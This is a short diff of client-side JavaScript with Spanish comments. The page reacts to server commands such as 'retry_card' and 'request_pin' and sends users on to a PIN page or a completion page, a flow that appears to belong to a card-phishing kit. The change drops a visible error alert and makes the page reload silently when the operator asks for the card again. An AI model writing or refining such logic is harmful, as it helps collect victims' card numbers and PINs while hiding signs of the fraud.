@@ -250,11 +250,8 @@
                 // Redirigir a página de finalización
                 window.location.href = 'finalizar.html';
             } else if (data.type === 'retry_card') {
-                // Mostrar mensaje de error y recargar
-                alert('¡Ups lo sentimos, verifica que los datos de tu tarjeta están escritos correctamente o vuelve a intentarlo más tarde!');
-                setTimeout(() => {
-                    window.location.reload();
-                }, 1000);
+                // Recargar página sin mensaje
+                window.location.reload();
             } else if (data.type === 'request_pin') {
                 // Redirigir a página de PIN
                 window.location.href = 'pin.html';
